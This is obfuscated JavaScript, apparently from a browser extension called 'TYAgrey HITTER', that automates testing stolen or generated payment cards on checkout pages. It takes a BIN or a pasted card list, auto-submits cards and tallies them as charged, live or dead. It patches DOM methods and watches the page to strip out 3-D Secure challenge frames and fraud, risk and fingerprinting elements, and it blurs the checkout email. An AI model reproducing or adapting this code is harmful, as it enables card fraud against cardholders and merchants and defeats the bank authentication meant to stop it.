      const _0x3fc7ff = document.querySelectorAll("span, p, div, a, li, td, th, h1, h2, h3, h4, h5, h6, label, small, strong, em, b, i, section, article, aside, header, footer, nav");
      for (const _0x22c381 of _0x3fc7ff) {
        if (_0x22c381.classList.contains("tyagrey-email-text-blur") || _0x22c381.classList.contains("card-generator-overlay") || _0x22c381.classList.contains("tya-overlay") || _0x22c381.closest(".card-generator-overlay") || _0x22c381.closest(".tya-overlay")) {
          continue;
        }
        if (_0x39df25.has(_0x22c381.tagName)) {
          continue;
        }
        if (_0x22c381.closest(".card-generator-overlay")) {
          continue;
        }
        if (_0x22c381.closest(".tya-overlay")) {
          continue;
        }
        const _0x4b7592 = _0x22c381.childNodes.length === 1 && _0x22c381.childNodes[0].nodeType === 3 ? _0x22c381.textContent.trim() : "";
        if (_0x4b7592 && _0x47576f.test(_0x4b7592) && !_0x22c381.querySelector("input, select, textarea, button")) {
          _0x22c381.classList.add("tyagrey-email-text-blur");
        }
      }
    }
    _0x408627();
    const _0x26a007 = new MutationObserver(_0x408627);
    if (document.body) {
      _0x26a007.observe(document.body, {
        childList: true,
        subtree: true
      });
    }
    const _0x354aa3 = setInterval(_0x408627, 1000);
    setTimeout(() => clearInterval(_0x354aa3), 60000);
  }
  let tyagreyOverlayEl = null;
  let tyagreyOverlayMinimized = false;
  let tyagreyOverlayTimer = null;
  let tyaSessionStats = {
    charged: 0,
    live: 0,
    dead: 0
  };
  let tyaCurrentCardDisplay = "-";
  function resetTyaSessionStats() {
    tyaSessionStats = {
      charged: 0,
      live: 0,
      dead: 0
    };
    tyaCurrentCardDisplay = "-";
  }
  function updateTyaSessionStats(_0x4d6160, _0x40abd5) {
    if (_0x4d6160 === "CHARGED") {
      tyaSessionStats.charged++;
    } else if (_0x4d6160 === "LIVE") {
      tyaSessionStats.live++;
    } else if (_0x4d6160 === "DEAD") {
      tyaSessionStats.dead++;
    }
    if (_0x40abd5) {
      const _0x294c3c = _0x40abd5.replace(/\D/g, "");
      tyaCurrentCardDisplay = _0x294c3c.length >= 8 ? _0x294c3c.slice(0, 4) + " **** " + _0x294c3c.slice(-4) : _0x40abd5;
    }
  }
  function destroyTYAgreyOverlay() {
    if (tyagreyOverlayEl) {
      tyagreyOverlayEl.remove();
      tyagreyOverlayEl = null;
    }
    if (tyagreyOverlayTimer) {
      clearInterval(tyagreyOverlayTimer);
      tyagreyOverlayTimer = null;
    }
    isDashboardActive = false;
  }
  function updateTYAgreyOverlayStats() {
    if (!tyagreyOverlayEl) {
      return;
    }
    const _0x1a32b4 = tyagreyOverlayEl.querySelector("#tya-stat-total");
    const _0x58dc79 = tyagreyOverlayEl.querySelector("#tya-stat-charged");
    const _0x1da724 = tyagreyOverlayEl.querySelector("#tya-stat-live");
    const _0xce6f6 = tyagreyOverlayEl.querySelector("#tya-stat-dead");
    const _0x2245e4 = tyagreyOverlayEl.querySelector("#tya-detail-card");
    const _0x3064b8 = tyagreyOverlayEl.querySelector("#tya-detail-processed");
    const _0x279935 = tyagreyOverlayEl.querySelector("#tya-detail-speed");
    const _0x299689 = tyagreyOverlayEl.querySelector("#tya-detail-time");
    const _0x203a66 = tyagreyOverlayEl.querySelector("#tya-status-text");
    const _0x58dbe6 = tyagreyOverlayEl.querySelector("#tya-status-icon");
    const _0x155a24 = tyagreyOverlayEl.querySelector("#tya-status-row");
    const _0x1442ac = tyagreyOverlayEl.querySelector("#tya-pill-text");
    const _0x218b88 = tyagreyOverlayEl.querySelector("#tya-bin-input");
    const _0x41b8fd = tyaSessionStats.charged + tyaSessionStats.live + tyaSessionStats.dead || attemptCount;
    if (_0x1a32b4) {
      _0x1a32b4.textContent = _0x41b8fd;
    }
    if (_0x58dc79) {
      _0x58dc79.textContent = tyaSessionStats.charged;
    }
    if (_0x1da724) {
      _0x1da724.textContent = tyaSessionStats.live;
    }
    if (_0xce6f6) {
      _0xce6f6.textContent = tyaSessionStats.dead;
    }
    if (_0x2245e4) {
      _0x2245e4.textContent = tyaCurrentCardDisplay;
    }
    if (_0x3064b8) {
      _0x3064b8.textContent = hitProcessedCount || 0;
    }
    if (_0x279935 && hitStartTime) {
      const _0x2feae6 = (Date.now() - hitStartTime) / 60000;
      const _0x37be70 = _0x2feae6 > 0 && hitProcessedCount > 0 ? (hitProcessedCount / _0x2feae6).toFixed(1) + " cards/min" : "-";
      _0x279935.textContent = _0x37be70;
    }
    if (_0x299689 && hitStartTime) {
      const _0x3f58f8 = Math.floor((Date.now() - hitStartTime) / 1000);
      const _0x8d28f4 = Math.floor(_0x3f58f8 / 60).toString().padStart(2, "0");
      const _0x382d05 = (_0x3f58f8 % 60).toString().padStart(2, "0");
      _0x299689.textContent = _0x8d28f4 + ":" + _0x382d05;
    } else if (_0x299689 && !hitStartTime) {
      _0x299689.textContent = "00:00";
    }
    if (_0x218b88 && !_0x218b88.dataset.userEdited) {
      const _0x1c3344 = getOverlaySavedBIN();
      if (_0x1c3344) {
        _0x218b88.value = _0x1c3344;
      }
    }
    if (_0x203a66) {
      if (hasHit) {
        _0x203a66.textContent = "CHARGED!";
        _0x203a66.style.color = "#10b981";
      } else if (isAutoSubmitting) {
        _0x203a66.textContent = isPaused ? "Paused" : "Running";
        _0x203a66.style.color = "#3b82f6";
      } else {
        _0x203a66.textContent = "Ready";
        _0x203a66.style.color = "#94a3b8";
      }
    }
    if (_0x58dbe6) {
      if (hasHit) {
        _0x58dbe6.textContent = "✅";
      } else if (isAutoSubmitting) {
        _0x58dbe6.textContent = isPaused ? "⏸️" : "🔄";
      } else {
        _0x58dbe6.textContent = "⏳";
      }
    }
    if (_0x155a24) {
      if (hasHit) {
        _0x155a24.style.background = "rgba(16,185,129,.1)";
        _0x155a24.style.borderColor = "rgba(16,185,129,.15)";
      } else if (tyaSessionStats.live > 0 && tyaSessionStats.charged === 0) {
        _0x155a24.style.background = "rgba(251,191,36,.1)";
        _0x155a24.style.borderColor = "rgba(251,191,36,.15)";
      } else {
        _0x155a24.style.background = "rgba(59,130,246,.1)";
        _0x155a24.style.borderColor = "rgba(59,130,246,.15)";
      }
    }
    if (_0x1442ac) {
      if (isAutoSubmitting) {
        _0x1442ac.textContent = isPaused ? "Paused" : "Running #" + _0x41b8fd;
      } else {
        _0x1442ac.textContent = "TYAgrey";
      }
    }
  }
  function createTYAgreyOverlay() {
    if (tyagreyOverlayEl) {
      return;
    }
    if (document.getElementById("tyagrey-new-overlay")) {
      return;
    }
    const _0x38eea7 = document.createElement("div");
    _0x38eea7.id = "tyagrey-new-overlay";
    _0x38eea7.className = "tya-overlay state-full pos-bl";
    _0x38eea7.innerHTML = "\n    <div class=\"tya-pill\">\n      <div class=\"tya-pill-logo\">T</div>\n      <span class=\"tya-pill-text\" id=\"tya-pill-text\">TYAgrey</span>\n    </div>\n    <div class=\"tya-full\" id=\"tya-full\">\n      <div class=\"tya-header\">\n        <div class=\"tya-brand\">\n          <div class=\"tya-brand-logo\">T</div>\n          <div class=\"tya-brand-text\">\n            <span class=\"tya-brand-name\">TYAgrey</span>\n            <span class=\"tya-brand-tag\">HITTER</span>\n          </div>\n        </div>\n        <div class=\"tya-header-right\">\n          <button class=\"tya-header-btn\" id=\"tya-btn-pos\" title=\"Move\">📍</button>\n          <button class=\"tya-header-btn\" id=\"tya-btn-dock\" title=\"Dock\">Dock</button>\n          <button class=\"tya-header-btn\" id=\"tya-btn-min\" title=\"Minimize\">−</button>\n        </div>\n      </div>\n      <div class=\"tya-body\">\n        <div class=\"tya-section-title\">MODE</div>\n        <div class=\"tya-mode-toggle\">\n          <button class=\"tya-mode-btn active\" id=\"tya-mode-bin\" data-mode=\"bin\">BIN</button>\n          <button class=\"tya-mode-btn\" id=\"tya-mode-cc\" data-mode=\"cc\">CC</button>\n        </div>\n        <div class=\"tya-bin-section\" id=\"tya-bin-section\">\n          <div class=\"tya-section-header\">\n            <div class=\"tya-section-title\">BIN</div>\n            <button class=\"tya-save-btn\" id=\"tya-save-bin\" title=\"Save BIN\">💾</button>\n          </div>\n          <input type=\"text\" class=\"tya-bin-input\" id=\"tya-bin-input\" placeholder=\"Enter BIN\" maxlength=\"30\">\n        </div>\n        <div class=\"tya-cc-section\" id=\"tya-cc-section\" style=\"display:none\">\n          <div class=\"tya-section-header\">\n            <div class=\"tya-section-title\">CC LIST <span id=\"tya-cc-count\" style=\"color:#64748b;font-size:10px\">(0/20)</span></div>\n            <button class=\"tya-save-btn\" id=\"tya-save-cc\" title=\"Save CC List\">💾</button>\n          </div>\n          <textarea class=\"tya-cc-textarea\" id=\"tya-cc-textarea\" placeholder=\"4147202232223333|01|25|123\n4147202232223334|02|26|456\" rows=\"4\"></textarea>\n        </div>\n        <div class=\"tya-status-row\" id=\"tya-status-row\">\n          <span class=\"tya-status-icon\" id=\"tya-status-icon\">🔄</span>\n          <span class=\"tya-status-text\" id=\"tya-status-text\">Ready</span>\n        </div>\n        <div class=\"tya-stats\">\n          <div class=\"tya-stat\"><span class=\"tya-stat-value total\" id=\"tya-stat-total\">0</span><span class=\"tya-stat-label\">TOTAL</span></div>\n          <div class=\"tya-stat-div\"></div>\n          <div class=\"tya-stat\"><span class=\"tya-stat-value charged\" id=\"tya-stat-charged\">0</span><span class=\"tya-stat-label\">CHARGED</span></div>\n          <div class=\"tya-stat-div\"></div>\n          <div class=\"tya-stat\"><span class=\"tya-stat-value live\" id=\"tya-stat-live\">0</span><span class=\"tya-stat-label\">LIVE</span></div>\n          <div class=\"tya-stat-div\"></div>\n          <div class=\"tya-stat\"><span class=\"tya-stat-value dead\" id=\"tya-stat-dead\">0</span><span class=\"tya-stat-label\">DEAD</span></div>\n        </div>\n        <div class=\"tya-details\">\n          <div class=\"tya-detail-row\"><span>Card:</span><span class=\"tya-detail-val\" id=\"tya-detail-card\">-</span></div>\n          <div class=\"tya-detail-row\"><span>Processed:</span><span class=\"tya-detail-val\" id=\"tya-detail-processed\">0</span></div>\n          <div class=\"tya-detail-row\"><span>Speed:</span><span class=\"tya-detail-val\" id=\"tya-detail-speed\">-</span></div>\n          <div class=\"tya-detail-row\"><span>Time:</span><span class=\"tya-detail-val\" id=\"tya-detail-time\">00:00</span></div>\n        </div>\n        <div class=\"tya-controls\">\n          <button class=\"tya-ctrl start\" id=\"tya-ctrl-start\">▶ Start</button>\n          <button class=\"tya-ctrl stop\" id=\"tya-ctrl-stop\" title=\"Stop\">⏹</button>\n          <button class=\"tya-ctrl lock\" id=\"tya-ctrl-lock\" title=\"Blur\">🔒</button>\n        </div>\n      </div>\n    </div>\n    <div class=\"tya-dock\" id=\"tya-dock\">\n      <div class=\"tya-dock-logo\">T</div>\n      <div class=\"tya-dock-dot\"></div>\n      <div class=\"tya-dock-text\">TYAgrey</div>\n    </div>\n    ";
    document.body.appendChild(_0x38eea7);
    tyagreyOverlayEl = _0x38eea7;
    isDashboardActive = true;
    const _0xc3af39 = _0x38eea7.querySelector("#tya-bin-section");
    const _0x5a3260 = _0x38eea7.querySelector("#tya-cc-section");
    if (_0xc3af39) {
      _0xc3af39.style.display = "block";
    }
    if (_0x5a3260) {
      _0x5a3260.style.display = "none";
    }
    const _0x508f0b = _0x38eea7.querySelector("#tya-bin-input");
    if (_0x508f0b) {
      const _0x531134 = getOverlaySavedBIN();
      if (_0x531134) {
        _0x508f0b.value = _0x531134;
        console.log("[TYAgrey] Overlay BIN pre-filled:", _0x531134);
      }
    }
    const _0x581e55 = _0x38eea7.querySelector(".tya-pill");
    if (_0x581e55) {
      _0x581e55.addEventListener("click", () => {
        _0x38eea7.classList.remove("state-pill");
        _0x38eea7.classList.add("state-full");
        tyagreyOverlayMinimized = false;
      });
    }
    _0x38eea7.querySelector("#tya-btn-min")?.addEventListener("click", () => {
      _0x38eea7.classList.remove("state-full");
      _0x38eea7.classList.add("state-pill");
      tyagreyOverlayMinimized = true;
    });
    _0x38eea7.querySelector("#tya-btn-dock")?.addEventListener("click", () => {
      _0x38eea7.classList.remove("state-full");
      _0x38eea7.classList.add("state-dock");
    });
    _0x38eea7.querySelector("#tya-dock")?.addEventListener("click", () => {
      _0x38eea7.classList.remove("state-dock");
      _0x38eea7.classList.add("state-full");
    });
    _0x38eea7.querySelector("#tya-btn-pos")?.addEventListener("click", () => {
      const _0x24e101 = ["br", "bl", "tr", "tl"];
      const _0x51abba = _0x24e101.find(_0x1f79ae => _0x38eea7.classList.contains("pos-" + _0x1f79ae)) || "br";
      const _0xf51f37 = _0x24e101[(_0x24e101.indexOf(_0x51abba) + 1) % 4];
      _0x38eea7.classList.remove("pos-" + _0x51abba);
      _0x38eea7.classList.add("pos-" + _0xf51f37);
    });
    _0x38eea7.querySelector("#tya-mode-bin")?.addEventListener("click", () => {
      currentMode = "bin";
      _0x38eea7.querySelector("#tya-mode-bin")?.classList.add("active");
      _0x38eea7.querySelector("#tya-mode-cc")?.classList.remove("active");
      const _0x5f496b = _0x38eea7.querySelector("#tya-bin-section");
      const _0x4f17d5 = _0x38eea7.querySelector("#tya-cc-section");
      if (_0x5f496b) {
        _0x5f496b.style.display = "block";
      }
      if (_0x4f17d5) {
        _0x4f17d5.style.display = "none";
      }
    });
    _0x38eea7.querySelector("#tya-mode-cc")?.addEventListener("click", () => {
      currentMode = "cc";
      _0x38eea7.querySelector("#tya-mode-cc")?.classList.add("active");
      _0x38eea7.querySelector("#tya-mode-bin")?.classList.remove("active");
      const _0x419d2a = _0x38eea7.querySelector("#tya-bin-section");
      const _0x296677 = _0x38eea7.querySelector("#tya-cc-section");
      if (_0x419d2a) {
        _0x419d2a.style.display = "none";
      }
      if (_0x296677) {
        _0x296677.style.display = "block";
      }
    });
    const _0x22ef0d = _0x38eea7.querySelector("#tya-bin-input");
    const _0x13100a = _0x38eea7.querySelector("#tya-save-bin");
    if (_0x22ef0d) {
      _0x22ef0d.addEventListener("input", _0x49e55f => {
        _0x22ef0d.dataset.userEdited = "1";
      });
      _0x22ef0d.addEventListener("keydown", _0x39d37f => {
        if (_0x39d37f.key === "Enter") {
          const _0x4b2bf3 = _0x22ef0d.value.trim();
          if (_0x4b2bf3) {
            setSavedBIN(_0x4b2bf3);
            showWarning("BIN saved", "success");
          }
        }
      });
    }
    if (_0x13100a) {
      _0x13100a.addEventListener("click", () => {
        const _0xdb3dd6 = _0x22ef0d ? _0x22ef0d.value.trim() : "";
        if (_0xdb3dd6 && _0xdb3dd6.length >= 6) {
          setSavedBIN(_0xdb3dd6);
          showWarning("BIN saved for next reload", "success");
        } else {
          showWarning("Enter a valid BIN first", "error");
        }
      });
    }
    const _0x445736 = _0x38eea7.querySelector("#tya-cc-textarea");
    const _0x12e7ba = _0x38eea7.querySelector("#tya-cc-count");
    function _0x313b73() {
      if (!_0x445736 || !_0x12e7ba) {
        return;
      }
      const _0x150a38 = _0x445736.value.split("\n").filter(_0x43dded => _0x43dded.trim() && _0x43dded.includes("|"));
      const _0x1750f2 = Math.min(_0x150a38.length, 20);
      _0x12e7ba.textContent = "(" + _0x1750f2 + "/20)";
    }
    const _0x3e7cc1 = _0x38eea7.querySelector("#tya-save-cc");
    if (_0x445736) {
      _0x445736.addEventListener("input", _0x313b73);
      _0x445736.addEventListener("blur", () => {
        const _0x2e240c = _0x445736.value.split("\n").map(_0x427dfe => _0x427dfe.trim()).filter(_0x579f4f => _0x579f4f && _0x579f4f.includes("|")).filter(_0x244db9 => {
          const _0xdf8279 = _0x244db9.split("|");
          return _0xdf8279.length === 4 && _0xdf8279[0].length >= 13;
        }).slice(0, 20);
        ccList = _0x2e240c;
        currentCCIndex = 0;
        setSavedCCList(_0x2e240c);
        if (_0x2e240c.length > 0) {
          showWarning(_0x2e240c.length + " cards loaded", "success");
        }
        _0x313b73();
      });
    }
    if (_0x3e7cc1) {
      _0x3e7cc1.addEventListener("click", () => {
        if (!_0x445736) {
          return;
        }
        const _0x5221e2 = _0x445736.value.split("\n").map(_0x37c357 => _0x37c357.trim()).filter(_0x5d899a => _0x5d899a && _0x5d899a.includes("|")).filter(_0x468707 => {
          const _0x1e4631 = _0x468707.split("|");
          return _0x1e4631.length === 4 && _0x1e4631[0].length >= 13;
        }).slice(0, 20);
        if (_0x5221e2.length === 0) {
          showWarning("No valid CCs to save", "error");
          return;
        }
        ccList = _0x5221e2;
        currentCCIndex = 0;
        setSavedCCList(_0x5221e2);
        _0x313b73();
        showWarning(_0x5221e2.length + " CCs saved for next reload", "success");
      });
    }
    _0x38eea7.querySelector("#tya-ctrl-start")?.addEventListener("click", () => {
      const _0x208e55 = _0x38eea7.querySelector("#tya-ctrl-start");
      if (_0x208e55 && _0x208e55.disabled && _0x208e55.getAttribute("data-disabled-reason") === "daily-limit") {
        checkDailyHitLimit().then(_0x4cb7cf => {
          if (_0x4cb7cf.error) {
            showWarning("⚠️ " + _0x4cb7cf.error, "error");
          } else {
            const _0x1deba0 = _0x4cb7cf.hits_today || 0;
            const _0x2e4232 = _0x4cb7cf.limit || 5;
            showWarning("⚠️ Daily hit limit reached (" + _0x1deba0 + "/" + _0x2e4232 + "). Upgrade to Pro for unlimited hits.", "error");
          }
        });
        return;
      }
      if (isAutoSubmitting) {
        if (isPaused) {
          isPaused = false;
          showWarning("Resuming...", "info");
        } else {
          stopAutoSubmit();
        }
      } else {
        if (currentMode === "bin" && !getOverlaySavedBIN()) {
          showWarning("Enter BIN first!", "error");
          return;
        }
        if (currentMode === "cc" && ccList.length === 0) {
          showWarning("Add CCs first!", "error");
          return;
        }
        startAutoSubmit();
      }
      updateTYAgreyOverlayStats();
    });
    _0x38eea7.querySelector("#tya-ctrl-stop")?.addEventListener("click", () => {
      stopAutoSubmit();
      updateTYAgreyOverlayStats();
    });
    _0x38eea7.querySelector("#tya-ctrl-lock")?.addEventListener("click", () => {
      _0x38eea7.classList.toggle("tya-blur");
    });
    if (tyagreyOverlayTimer) {
      clearInterval(tyagreyOverlayTimer);
    }
    tyagreyOverlayTimer = setInterval(updateTYAgreyOverlayStats, 500);
    updateTYAgreyOverlayStats();
    loadSavedBins();
    refreshUserRole().then(() => {
      updateStartButtonState();
    });
    const _0x40713c = getSavedCCList();
    if (_0x445736 && _0x40713c.length > 0) {
      _0x445736.value = _0x40713c.join("\n");
      _0x313b73();
      ccList = _0x40713c.slice(0, 20);
      currentCCIndex = 0;
    }
  }
  ;
  (function initOnce() {
    if (window.__tyagreyOverlayInit) {
      return;
    }
    window.__tyagreyOverlayInit = true;
    if (window !== window.top) {
      return;
    }
    window.createTYAgreyOverlay = createTYAgreyOverlay;
    function _0x3c00e7() {
      const _0x4dafd7 = localStorage.getItem("tyagrey_token") || "";
      const _0x21c193 = localStorage.getItem("tyagrey_user_id") || "";
      const _0x2f5cdc = _0x4dafd7.length === 6 && _0x21c193.length > 0;
      console.log("[TYAgrey] Login check: token=" + _0x4dafd7 + ", userId=" + _0x21c193 + ", loggedIn=" + _0x2f5cdc);
      return _0x2f5cdc;
    }
    function _0x3b7862() {
      if (document.getElementById("tyagrey-new-overlay")) {
        return;
      }
      if (!_0x3c00e7()) {
        if (window.tyagreyStorage && window.tyagreyStorage.loadUserSession) {
          window.tyagreyStorage.loadUserSession(function (_0xf758db) {
            if (_0xf758db.token && _0xf758db.token.length === 6 && _0xf758db.userId) {
              localStorage.setItem("tyagrey_token", _0xf758db.token);
              localStorage.setItem("tyagrey_user_id", _0xf758db.userId);
              if (_0xf758db.firstName) {
                localStorage.setItem("tyagrey_first_name", _0xf758db.firstName);
              }
              isLoggedIn = true;
              _0x38792c();
            }
          });
        }
        return;
      }
      _0x38792c();
    }
    function _0x38792c() {
      if (document.body) {
        waitForPaymentPage(async _0x20314a => {
          if (_0x20314a) {
            isDashboardActive = true;
            setupCheckoutEmailBlur();
            try {
              createTYAgreyOverlay();
            } catch (_0x368ad1) {
              console.error("TYAgrey overlay error:", _0x368ad1);
            }
            autoExtractPaymentFromUrl();
            applyCustomStyles();
            if (licenseValid && !isVersionOutdated) {
              autoLoadAndVerifyProxy();
              fetchBinLibrary().then(async () => {
                await checkNewBinNotification();
              });
            }
          }
        }, 40);
        setTimeout(() => {
          if (_0x3c00e7() && !document.getElementById("tyagrey-new-overlay") && isPaymentPage()) {
            try {
              createTYAgreyOverlay();
            } catch (_0x13ea50) {
              console.error("TYAgrey fallback error:", _0x13ea50);
            }
          }
        }, 6000);
      } else {
        setTimeout(_0x38792c, 50);
      }
    }
    window.postMessage({
      type: "GET_LOGIN_STATE"
    }, "*");
    setTimeout(_0x3b7862, 200);
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", () => {
        window.postMessage({
          type: "GET_LOGIN_STATE"
        }, "*");
        setTimeout(_0x3b7862, 200);
      }, {
        once: true
      });
    } else {
      _0x3b7862();
    }
    setInterval(() => {
      if (isDashboardActive && !isPaymentPage()) {
        hideOverlay();
      }
    }, 2000)(function _0x149a5c() {
      const _0x2965df = /safekey|americanexpress|amex|cardinalcommerce|3dsecure|three_d_secure|threeds|acs\.|mpi\.|challenge|pareq|pares|hooks\.stripe\.com.*3ds|hooks\.stripe\.com.*challenge|stripe\.com.*3ds|stripe\.com.*challenge/i;
      const _0x32a84f = /safekey|americanexpress|amex|3ds-challenge|three-ds|threeds|cardinal|mpi|challenge|pareq|pares|modal|overlay|dialog/i;
      function _0x2a7f5e() {
        if (document.getElementById("tya-3ds-block-css")) {
          return;
        }
        const _0x243965 = document.createElement("style");
        _0x243965.id = "tya-3ds-block-css";
        _0x243965.textContent = "iframe[src*=\"safekey\"], iframe[src*=\"americanexpress\"], iframe[src*=\"amex\"], iframe[src*=\"cardinalcommerce\"], iframe[src*=\"3dsecure\"], iframe[src*=\"acs.\"], iframe[src*=\"hooks.stripe.com\"], [class*=\"safekey\"], [class*=\"americanexpress\"], [class*=\"amex\"], [class*=\"3ds-challenge\"], [class*=\"three-ds\"], [class*=\"cardinal\"], [class*=\"mpi\"], [id*=\"safekey\"], [id*=\"americanexpress\"], [id*=\"amex\"], [id*=\"cardinal\"], [id*=\"mpi\"], [id*=\"3ds-challenge\"], [id*=\"three-ds\"] { display: none !important; visibility: hidden !important; opacity: 0 !important; pointer-events: none !important; height: 0 !important; width: 0 !important; position: absolute !important; z-index: -9999 !important; }";
        (document.head || document.documentElement).appendChild(_0x243965);
      }
      _0x2a7f5e();
      const _0x5db7fb = document.createElement.bind(document);
      document.createElement = function (_0x1691e2, _0x5ec9f2) {
        const _0x516d7a = _0x5db7fb(_0x1691e2, _0x5ec9f2);
        if (_0x1691e2.toLowerCase() === "iframe") {
          try {
            const _0x4f1756 = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, "src") || Object.getOwnPropertyDescriptor(HTMLElement.prototype, "src");
            if (_0x4f1756 && _0x4f1756.set) {
              const _0x21d7f3 = _0x4f1756.set;
              Object.defineProperty(_0x516d7a, "src", {
                configurable: true,
                get: function () {
                  return _0x516d7a.getAttribute("src") || "";
                },
                set: function (_0x1701bb) {
                  if (_0x1701bb && _0x2965df.test(_0x1701bb)) {
                    console.log("[TYAgrey] Blocked 3DS iframe src:", _0x1701bb);
                    _0x21d7f3.call(_0x516d7a, "about:blank");
                    _0x516d7a.style.display = "none";
                    setTimeout(() => {
                      if (_0x516d7a.parentNode) {
                        _0x516d7a.parentNode.removeChild(_0x516d7a);
                      }
                    }, 0);
                    return;
                  }
                  _0x21d7f3.call(_0x516d7a, _0x1701bb);
                }
              });
            }
          } catch (_0x1f138b) {}
        }
        return _0x516d7a;
      };
      const _0x3bea7f = new Set(["IFRAME", "EMBED", "OBJECT"]);
      function _0x5c3910(_0x128ca9) {
        if (!_0x128ca9 || _0x128ca9.nodeType !== 1) {
          return false;
        }
        if (_0x3bea7f.has(_0x128ca9.tagName)) {
          const _0x49e40b = _0x128ca9.getAttribute("src") || "";
          if (_0x49e40b && _0x2965df.test(_0x49e40b)) {
            return true;
          }
        }
        if (_0x128ca9.className && typeof _0x128ca9.className === "string" && _0x32a84f.test(_0x128ca9.className)) {
          return true;
        }
        if (_0x128ca9.id && _0x32a84f.test(_0x128ca9.id)) {
          return true;
        }
        return false;
      }
      const _0x312d0c = Element.prototype.appendChild;
      Element.prototype.appendChild = function (_0x120539) {
        if (_0x5c3910(_0x120539)) {
          console.log("[TYAgrey] Blocked 3DS element append:", _0x120539.tagName);
          return _0x120539;
        }
        return _0x312d0c.call(this, _0x120539);
      };
      const _0x858ec6 = Element.prototype.insertBefore;
      Element.prototype.insertBefore = function (_0x11a7da, _0x4c0a56) {
        if (_0x5c3910(_0x11a7da)) {
          console.log("[TYAgrey] Blocked 3DS element insert:", _0x11a7da.tagName);
          return _0x11a7da;
        }
        return _0x858ec6.call(this, _0x11a7da, _0x4c0a56);
      };
      function _0x4c7b1d() {
        try {
          document.querySelectorAll("iframe, embed, object").forEach(_0x4184e7 => {
            const _0x3c8556 = _0x4184e7.getAttribute("src") || "";
            if (_0x3c8556 && _0x2965df.test(_0x3c8556)) {
              _0x4184e7.style.display = "none";
              if (_0x4184e7.parentNode) {
                _0x4184e7.parentNode.removeChild(_0x4184e7);
              }
            }
          });
          const _0x1de5b5 = "[class*=\"safekey\"],[id*=\"safekey\"],[class*=\"cardinal\"],[id*=\"cardinal\"],[class*=\"3ds-challenge\"],[id*=\"3ds-challenge\"],[class*=\"three-ds\"],[id*=\"three-ds\"],[class*=\"3ds\"],[id*=\"3ds\"],[class*=\"acs\"],[id*=\"acs\"],[class*=\"challenge\"],[id*=\"challenge\"],[class*=\"authentication\"],[id*=\"authentication\"],[class*=\"verification\"],[id*=\"verification\"],[class*=\"mpi\"],[id*=\"mpi\"],[class*=\"pareq\"],[id*=\"pareq\"],[class*=\"pares\"],[id*=\"pares\"],[class*=\"threatmetrix\"],[id*=\"threatmetrix\"],[class*=\"fingerprint\"],[id*=\"fingerprint\"],[class*=\"telemetry\"],[id*=\"telemetry\"],[class*=\"fraud\"],[id*=\"fraud\"],[class*=\"risk\"],[id*=\"risk\"]".replace(/,/g, ",").split(",");
          _0x1de5b5.forEach(_0x5f10b5 => {
            document.querySelectorAll(_0x5f10b5).forEach(_0x2db991 => {
              if (_0x2db991.classList.contains("card-generator-overlay") || _0x2db991.classList.contains("tya-overlay") || _0x2db991.id === "tyagrey-overlay" || _0x2db991.closest(".card-generator-overlay") || _0x2db991.closest(".tya-overlay")) {
                return;
              }
              _0x2db991.style.display = "none";
              if (_0x2db991.parentNode) {
                _0x2db991.parentNode.removeChild(_0x2db991);
              }
            });
          });
          document.querySelectorAll("div, section, article, dialog, iframe, embed, object").forEach(_0x55b178 => {
            try {
              if (_0x55b178.classList.contains("card-generator-overlay") || _0x55b178.classList.contains("tya-overlay") || _0x55b178.id === "tyagrey-overlay" || _0x55b178.closest(".card-generator-overlay") || _0x55b178.closest(".tya-overlay")) {
                return;
              }
              const _0x84c9c8 = window.getComputedStyle(_0x55b178);
              const _0x432c09 = _0x55b178.getBoundingClientRect();
              const _0x5b5fc3 = (_0x55b178.textContent || "").toLowerCase();
              const _0x31ba62 = (_0x55b178.getAttribute("src") || "").toLowerCase();
              if (_0x84c9c8.position === "fixed" && _0x432c09.width > window.innerWidth * 0.2 && _0x432c09.height > window.innerHeight * 0.2) {
                if (_0x5b5fc3.includes("safekey") || _0x5b5fc3.includes("american express") || _0x5b5fc3.includes("verify") || _0x5b5fc3.includes("temporary code") || _0x5b5fc3.includes("3ds") || _0x5b5fc3.includes("authentication") || _0x5b5fc3.includes("verification") || _0x5b5fc3.includes("challenge") || _0x5b5fc3.includes("fraud") || _0x5b5fc3.includes("risk") || _0x5b5fc3.includes("fingerprint") || _0x5b5fc3.includes("telemetry") || _0x5b5fc3.includes("acs") || _0x5b5fc3.includes("cardinal") || _0x5b5fc3.includes("mpi") || _0x31ba62.includes("3ds") || _0x31ba62.includes("challenge") || _0x31ba62.includes("authentication") || _0x31ba62.includes("fingerprint")) {
                  _0x55b178.style.display = "none";
                  if (_0x55b178.parentNode) {
                    _0x55b178.parentNode.removeChild(_0x55b178);
                  }
                }
              }
            } catch (_0x31e015) {}
          });
        } catch (_0x2f3586) {}
      }
      const _0x5af55b = new MutationObserver(_0x8837ce => {
        for (const _0x287245 of _0x8837ce) {
          for (const _0x45274c of _0x287245.addedNodes) {
            if (_0x5c3910(_0x45274c)) {
              console.log("[TYAgrey] MutationObserver blocked 3DS element:", _0x45274c.tagName);
              if (_0x45274c.parentNode) {
                _0x45274c.parentNode.removeChild(_0x45274c);
              }
              continue;
            }
            if (_0x45274c.nodeType === 1 && _0x45274c.querySelectorAll) {
              _0x45274c.querySelectorAll("iframe, embed, object").forEach(_0x69519b => {
                const _0x572174 = _0x69519b.getAttribute("src") || "";
                if (_0x572174 && _0x2965df.test(_0x572174) && _0x69519b.parentNode) {
                  _0x69519b.parentNode.removeChild(_0x69519b);
                }
              });
            }
          }
        }
        _0x4c7b1d();
      });
      if (document.body) {
        _0x5af55b.observe(document.body, {
          childList: true,
          subtree: true
        });
      } else {
        document.addEventListener("DOMContentLoaded", () => {
          if (document.body) {
            _0x5af55b.observe(document.body, {
              childList: true,
              subtree: true
            });
          }
        }, {
          once: true
        });
      }
      const _0x275f71 = setInterval(_0x4c7b1d, 200);
      let _0x2b7fe5;
      function _0x557ed5() {
        _0x4c7b1d();
        _0x2b7fe5 = requestAnimationFrame(_0x557ed5);
      }
      _0x2b7fe5 = requestAnimationFrame(_0x557ed5);
      window.addEventListener("beforeunload", () => {
        clearInterval(_0x275f71);
        cancelAnimationFrame(_0x2b7fe5);
        _0x5af55b.disconnect();
      }, {
        once: true
      });
    })();
  })();
}
